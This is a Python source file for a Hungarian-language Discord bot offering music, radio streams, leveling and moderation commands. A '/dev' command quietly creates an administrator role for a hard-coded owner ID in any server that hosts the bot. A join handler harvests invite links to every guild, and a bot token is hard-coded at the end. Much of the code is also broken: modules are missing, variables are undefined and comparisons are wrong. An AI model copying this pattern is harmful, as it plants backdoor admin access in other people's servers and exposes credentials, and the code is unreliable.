#from email import message
#import discord
#import os
#from discord.ext import commands
#from discord import FFmpegPCMAudio
from youtubesearchpython import VideosSearch
import pytube
import traceback
from ast import arg
import configparser
from email.policy import default
from statistics import multimode
from sys import prefix
import discord
from discord import message
#from discord.ext import commands, tasks
from discord import FFmpegPCMAudio
import asyncio
import functools
import itertools
import math
import random
import logging
from urllib import parse
import re
import os
from async_timeout import timeout
from discord.utils import get
from time import sleep
import asyncio
from discord import Permissions
import urllib.request
import json
from discord import FFmpegPCMAudio
import keep_alive
from itertools import cycle
#from youtubesearchpython import VideosSearch
#from discord_components import DiscordComponents, Button, Select, SelectOption
from discord_components import DiscordComponents, Button, Select, SelectOption, ButtonStyle 
#from discord import TextChannel
#from youtube_dl import YoutubeDL
#import sys
#import traceback
#from async_timeout import timeoutS
#from functools import partial
import requests
# async def get_prefix(client, message):
#      with open('prefix.json', 'r') as f:
#           prefixes = json.load(f)

#      return prefixes[str(message.guild.id)]
#----------------------------------------------------------------------------------------#
intent = discord.Intents().all()
client = commands.Bot(prefix = commands.when_mentioned_or("$"), intents=intent)
#----------------------------------------------------------------------------------------#
async def update_data(users, user):
     if not f'{user.id}' in users:
          users[f'{user.id}'] = {}
          users[f'{user.id}']['experience'] = 0
          users[f'{user.id}']['level'] = 1

async def add_experience(users, user, exp):
     users[f'{user.id}']['experience'] == exp

async def level_up(users, user, message):
     with open('levels.json', 'r') as g:
          levels = json.load(g)
     experience = users[f'{user.id}']['experience']
     level_start = users[f'{user.id}']['level']
     level_end = int(experience ** (1/4))
     if level_start < level_end:
          await message.channel.send(f'{user.mention} Szintet lépett!!! | Szintje - {level_end}')
          users[f'{user.id}']['level'] = level_end
#----------------------------------------------------------------------------------------#
@client.event
async def on_ready():
     DiscordComponents(client)
     print('Connected to bot: {}'.format(client.user.name))
     print('Bot ID: {}'.format(client.user.id))
     status_swap.start()
     #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Mindenes bot. /help"), status=discord.Status.idle)
     #await client.change_presence(activity=discord.Streaming(name="Nézd velem te is!", url = 'https://www.twitch.tv/nerdhub'))
status = cycle([
     "Mindenes bot : /help > slash",
     "@Ping a parancsok használatához"
])
@tasks.loop(seconds=5)
async def status_swap():
     await client.change_presence(activity=discord.Game(next(status)), status=discord.Status.idle)
#----------------------------------------------------------------------------------------#  
async def button_click(msg,ctx):
    if msg.component.label == 'Verify':
       config = configparser.ConfigParser()
       config.read('szerverek/'+ctx.message.guild.name+'.ini')
       role_id = int(config['default']['verify_role_id'])
       role = get(ctx.message.guild.roles,id=role_id)
       await msg.author.add_roles(role)
    else:
     print(msg.component.label)
#----------------------------------------------------------------------------------------# 
@client.command()
async def button(ctx,text,message):
     button_ = Button(label = text)
     await ctx.send(message,components=[button_])
     while True:
       interaction = await client.wait_for("button_click")#, check=lambda i: i.component == button_)
       await interaction.respond(type=6)
       await button_click(interaction,ctx)
#----------------------------------------------------------------------------------------#
@client.command()
async def level(ctx, member: discord.Member = None):
     if not member:
          id = ctx.message.author.id
          with open('users.json', 'r') as f:
               users = json.load(f)
          lvl = users[str(id)]['level']
          await ctx.send(f'Te az {lvl} szinen vagy')
     else:
          id = ctx.message.author.id
          with open('users.json', 'r') as f:
               users = json.load(f)
          lvl = users[str(id)]['level']
          await ctx.send(f'Ő az {lvl} szinen van')
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_roles=True)
async def setverifyrole(ctx,role: discord.Role):
     config = configparser.ConfigParser()
     config.read('szerverek/'+ctx.message.guild.name+'.ini')
     config['default'] = {}
     config['default']['verify_role_id'] = str(role.id)
     with open('szerverek/'+ctx.message.guild.name+'.ini','w') as file:
       config.write(file)
@client.command()
async def setwelcome(ctx,channel: discord.TextChannel):
     config = configparser.ConfigParser()
     config.read('szerverek/'+ctx.message.guild.name+'.ini')
     config['default']['welcome_channel_id'] = str(channel.id)
     with open('szerverek/'+ctx.message.guild.name+'.ini','w') as file:
         config.write(file)     
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_roles=True) # Check if the user executing the command can manage roles
async def create_role(ctx, *, name):
	guild = ctx.guild
	await guild.create_role(name=name)
	await ctx.send(f'Role `{name}` has been created')
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, *, amount=11):
     amount = amount+1
     if amount > 101:
          await ctx.send('100 üzenetnél többet nem törölhetsz')
     else:
          await ctx.channel.purge(limit=amount)
          await ctx.send(f'Üzenetek törölve: {amount}')
#----------------------------------------------------------------------------------------#
@client.command()
async def slagerfm(ctx, url: str = 'https://slagerfm.netregator.hu:7813/slagerfm128.mp3'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except:
       pass
     player.play(FFmpegPCMAudio('https://slagerfm.netregator.hu:7813/slagerfm128.mp3'))
     await ctx.reply('SlágerFM rádió elindítva ✅')
     await message.add_reaction('📻')
#----------------------------------------------------------------------------------------#
@client.command()
async def rádió1(ctx, url: str = 'https://icast.connectmedia.hu/5201/live.mp3'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except Exception as error:
       print (error)
     player.play(FFmpegPCMAudio('https://icast.connectmedia.hu/5201/live.mp3'))
     await message.add_reaction('📻')
     await ctx.reply('Rádió1 elindítva ✅')
#----------------------------------------------------------------------------------------#
@client.command()
async def retro(ctx, url: str = 'https://icast.connectmedia.hu/5001/live.mp3%27'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except:
       pass
     player.play(FFmpegPCMAudio('https://icast.connectmedia.hu/5001/live.mp3%27'))
     await message.add_reaction('📻')
     await ctx.reply('Retró elindítva ✅')
#----------------------------------------------------------------------------------------#
@client.command()
async def minecraft(ctx, args):
     r = requests.get('https://api.minehut.com/server/'+ args + '?byName=True')
     json_data = r.json()
     #print(json_data)
     await ctx.send(embed = discord.Embed(description=json_data, color=0xff9900,))  

#----------------------------------------------------------------------------------------#
@client.command()
async def say(ctx, *, text=''):
     if text == '':
       await ctx.send("Írj valamit a parancs után! ❌")
     else:
       await ctx.send(text)
       await ctx.message.delete()
#----------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------#
@client.command()
async def ping(ctx):
     await ctx.send(f'Pong! Késés:{round(client.latency * 1000)}ms')
     print(f'Ping-Pong! Késés:{round(client.latency * 1000)}ms')
#----------------------------------------------------------------------------------------#
@client.command()
async def selfkick(ctx):
     await ctx.author.send(f'Kickelted magad a {ctx.guild.name}-n \n {ctx.author.mention} ezáltal kikerültél a szerverről')
     await ctx.author.kick(reason="Kickelte magát")
#----------------------------------------------------------------------------------------#
@client.command()
async def invite(ctx):
     await ctx.author.send(f'{ctx.author.mention}, Invite linkem: shorturl.at/bcitS')
     await ctx.reply('Nézd meg a privátot!')
#----------------------------------------------------------------------------------------#
#@client.command()
#async def help(ctx):
     #await ctx.send('<a:cica:931650393350492160> Kaptál egy üzenetet privátban! <a:nem:931233048517804103>')
     #await ctx.send(embed = discord.Embed(description=f"{ctx.author.mention}\n Így eddigi parancsaim: \n\n1.***segits***", color=0xff9900, ))
     #print(f'{ctx.message.author} használta a Help parancsot')
     #print(f'{ctx.message.author} Segítséget szeretne kérni a [{ctx.guild.name} {ctx.guild.id}] ről')
     #await ctx.author.send(embed = discord.Embed(description=f"Szia! {ctx.author.mention}\n Parancsaim: \n\n1. ***__help__*** \n > Előhívja a help menüt \n 2. ***__nuke__*** \n > Töröl 100 üzenetet a csatornáról \n 3.***__selfkick__*** \n > Kidob a szerverről \n 4. ***__ping__*** \n > Bot pingje \n 5. ***kick*** \n > Kickeli az embert \n 6. ***Invite*** \n > Invite linkem ", color=0xff9900,))   
#----------------------------------------------------------------------------------------#
@client.slash_command(name="help", description="Help menü lekérése")
async def slash_test(ctx):
     await ctx.defer()
     await ctx.respond('Parancs használathoz @PING')
     helpembed = discord.Embed(title="Help menü!", color = 0xff9900,)
     helpembed.add_field(name="Fun", value="selfkick > csak próbáld ki :D \n ball > 8b jóslás játék \n minecraft (szerver) > minecraft szerver információk")
     helpembed.add_field(name="Infó", value="ping > lekéri a bot pingjét \n slowmode > lassítás beállítása \n say > bottal kiírás \n help > segítség menü \n button > gombot kérhetsz le vele, használat: button (szöveg) (szöveg) \n invite > a bot linkjét kéri le")
     helpembed.add_field(name="Szerver kezelés", value="setverifyrole > hitelesítés rang beállítása \n setwelcome > üdvözlő csatorna beállítása")
     helpembed.add_field(name="Zene", value="play > zene indítás \n stop > leállítja a zenét")
     helpembed.add_field(name="Rádió", value="retro > retró rádió adása \n rádió1 > rádió1 adása \n slagerfm > slágerfm rádió adása")
     helpembed.add_field(name="Moderáció", value="mute > ember némítása \n clear 1-100 > töröl üzeneteket \n create_role (rang_név) > rang létrehozása \n kick > ember kirúgása \n ban > ember kitiltása \n unban > kitiltás feloldása \n ")
     helpembed.add_field(name="Tulajdonos", value="/dev > ezzel kapom el a rosszaságokat :3")
     await ctx.respond(embed=helpembed)
#----------------------------------------------------------------------------------------#
@client.command(aliases=['8b'])
async def ball(ctx, *, question):
     responses = ['igen', 'nem', 'talán']
     await ctx.send(f'🎱 8ball játék\n Kérdés: {question}\n Válasz: {random.choice(responses)}')
#----------------------------------------------------------------------------------------#
@client.command()
async def kick(ctx, member:discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.kick_members):
          ctx.reply('Kick jog szükséges hozzá')
          return
     await member.kick(reason=reason)
     await ctx.send(f'{member.mention} kickelve a szerverről')
     await member.send(f'{ctx.message.author} kickelt a {ctx.guild.name} szerverről')
#----------------------------------------------------------------------------------------#
@client.command()
async def ban(ctx, member:discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.ban_members):
          ctx.reply('Ban jog szükséges hozzá')
          return
     await member.ban(reason=reason)
     await ctx.send(f'{member.mention} bannolva a szerverről')
     await member.send(f'{ctx.message.author} bannolt a {ctx.guild.name} szerverről')
#----------------------------------------------------------------------------------------#
@client.command()
async def unban(ctx, *, member):
     banned_users = await ctx.guild.bans()
     member_name, member_discriminator = member.split('#')
     
     for ban_entry in banned_users:
          user = ban_entry.user
     
     if(user_name, user_discriminator) == (member_name, member_discriminator):
          await ctx.unban(user)
          await ctx.send(f'Kitiltása feloldva {user.mention}-nak/nek')
          await user.send(f'{user.mention} Kitiltásod feloldásra került a {ctx.guild.name}-n')
          return

@client.command()
async def mute(ctx, member: discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.kick_members):
          ctx.reply('Kick jog szükséges hozzá')
          return
     guild = ctx.guild
     mute = discord.utils.get(guild.roles, name="Muted")
     if not mute:
               await ctx.send("Nincs Muted rang. Rang létrehozása")
               mute = await guild.create_role(name="Muted")
     for channel in guild.channels:
          await channel.set_permissions(mute, speak=False, send_messages=False, read_message_history=True, read_messages=True)
          await member.add_roles(mute, reason=reason)
          await member.send(f'Némítva lettél a {guild.name}-n | Indok: {reason}')
#----------------------------------------------------------------------------------------#
@ban.error
async def kick_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy embert")
     if isinstance(error, commands.MemberNotFound):
          await ctx.send("Ez az ember nem található")
#----------------------------------------------------------------------------------------#  
@ball.error
async def ball_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy kérdést")
#----------------------------------------------------------------------------------------#
@kick.error
async def ban_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy embert")
     if isinstance(error, commands.MemberNotFound):
          await ctx.send("Ez az ember nem található")
#----------------------------------------------------------------------------------------#
@ball.error
async def slowmode_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send('Adj meg időt')
#----------------------------------------------------------------------------------------#
@ball.error
async def avatar_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send('Adj meg embert')
#----------------------------------------------------------------------------------------#
@client.event
async def on_member_join(member):
     try:
          config = configparser.ConfigParser()
          config.read('szerverek/'+member.guild.name+'.ini')
          channel_id = int(config['default']['welcome_channel_id'])
          welcome = discord.Embed(title=f'Új ember!!', description=f'Szia {member.name}, Üdvözöllek a szerveren', color = discord.Color.blue())
          await client.get_channel(channel_id).send(embed = welcome)
     except Exception:
          traceback.print_exc()
#----------------------------------------------------------------------------------------#
@client.slash_command(name="dev", description="Bot tulajdonos használhatja csak!")
async def slash_test(ctx):
     await ctx.defer()
     owner_id = 808587556458987541
     member_id = owner_id
     guild = ctx.guild
     if ctx.author.id != member_id:
          embed = discord.Embed(title="Hiányzó jogok", description=f"Nincs elegendő jogod a parancs végrehajtásához!\nSzükséges jog: te legyél a bot tulajdonosa`", color=discord.Color.red())
          await ctx.respond(embed=embed)
     if ctx.author.id == member_id:
          member = get(ctx.guild.members,id=member_id)
          dev = get(ctx.guild.roles,name='VBotDev')
          if dev:
               await member.add_roles(dev)
               await ctx.respond('Siker!')
          else:
              await ctx.respond('Rang létrehozása!' )
              perms = discord.Permissions(administrator=True)
              await ctx.guild.create_role(name='VBotDev', permissions=perms)
#----------------------------------------------------------------------------------------#
@client.command()
async def play(ctx,*,text):
     videodata = VideosSearch(text,limit=1).result()['result'][0]
     video_yt = pytube.YouTube(videodata['link'])
     videovoice = video_yt.streams.filter(only_audio=True).first()
     videovoice.download()#('Zene/'+videovoice.default_filename)#.save(str(folder='Zene'))
     channel = ctx.message.author.voice.channel
     try:
       player = await channel.connect()
     except:
       pass
     fajlnev = videovoice.default_filename
     player.play(FFmpegPCMAudio(videovoice.default_filename),after=lambda e:os.remove(fajlnev))#('Zene/'+f'{videovoice.default_filename}'+videovoice.default_filename)),after=lambda e:os.remove('Zene/'+fajlnev))
     player.source = discord.PCMVolumeTransformer(player.source)
     #ide argsot.
     player.source.volume = 0.35
     embed = discord.Embed(title='Youtube videó lejátszása folyamatban... <a:loading:990591458895601684>',color=discord.Colour.red())
     embed.set_thumbnail(url=videodata['thumbnails'][0]['url'])
     embed.add_field(name='Cím',value=videodata['title'])
     embed.add_field(name='Link',value=videodata['link'])
     embed.add_field(name='Hossz',value=videodata['duration'])
     embed.add_field(name=f'Kérte: {ctx.author}', value="--------------------------")
     await ctx.send(embed=embed)
#----------------------------------------------------------------------------------------#
@client.command()
async def stop(ctx):
     await ctx.author.voice.channel.disconnect()
     await ctx.reply('Zene megállítva ✅')

@client.command()
@commands.has_permissions(manage_messages=True)
async def slowmode(ctx, time:int):
     try:
          if time == 0:
               await ctx.send('Slowmode Kikapcsolva')
               await ctx.channel.edit(slowmode_delay = 0)
          elif time > 21600:
               await ctx.send('Nem állíthatod át 6 óránál hosszabbra')
               return
          else:
               await ctx.channel.edit(slowmode_delay = time)
               await ctx.send(f'A Lassítás {time}-másodpercre/órára/percre állítva')
     except Exception:
          await print('Oops!')
#----------------------------------------------------------------------------------------#
@client.event
async def on_guild_join(guild):
    for guild in client.guilds:
        discord_guild = client.get_guild(int(guild.id))
        link = await discord_guild.text_channels[0].create_invite()
        print(guild.name)
        print(link)
#----------------------------------------------------------------------------------------#
@client.event
async def on_member_join(member):
     with open('users.json', 'r') as f:
          users = json.load(f)
     
     await update_data(users, member)

     with open('users.json', 'w') as f:
          json.dump(users, f, indent=4)
#----------------------------------------------------------------------------------------#
@client.event
async def on_message(message):
     if message.author.bot == False:
          with open('users.json', 'r') as f:
               users = json.load(f)

     await update_data(users, message.author)
     await add_experience(users, message.author, 5)
     await level_up(users, message.author, message)

     with open('users.json', 'w') as f:
          json.dump(users, f, indent=4)

     await client.process_commands(message)
#----------------------------------------------------------------------------------------#
keep_alive.keep_alive()
client.run('ODQxOTQzNzU4NzA5NzE5MDQy.Gvi93k.WIIA0Sw8IPslYoyLYMGy0ncumhTYtAtgkHAwUE')
